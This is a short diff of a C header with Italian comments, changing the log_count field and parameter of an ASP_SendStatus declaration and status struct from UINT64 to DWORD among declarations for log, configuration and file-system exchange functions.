@@ -15,7 +15,7 @@ extern BOOL ASP_GetDownload(DWORD *, WCHAR ***);
 extern BOOL ASP_SendLog(char *, DWORD);
 extern BOOL ASP_ReceiveConf(char *);
 extern BOOL ASP_GetFileSystem(DWORD *, fs_browse_elem **);
-extern BOOL ASP_SendStatus(UINT64 log_count, UINT64 log_size);
+extern BOOL ASP_SendStatus(DWORD log_count, UINT64 log_size);
 
 // Valori di ritorno della funzione ASP_Poll()
 #define ASP_POLL_FETCHING 0
@@ -67,7 +67,7 @@ typedef struct {
 } asp_request_log;
 
 typedef struct {
-	UINT64 log_count;
+	DWORD log_count;
 	UINT64 log_size;
 } asp_request_stat;
 
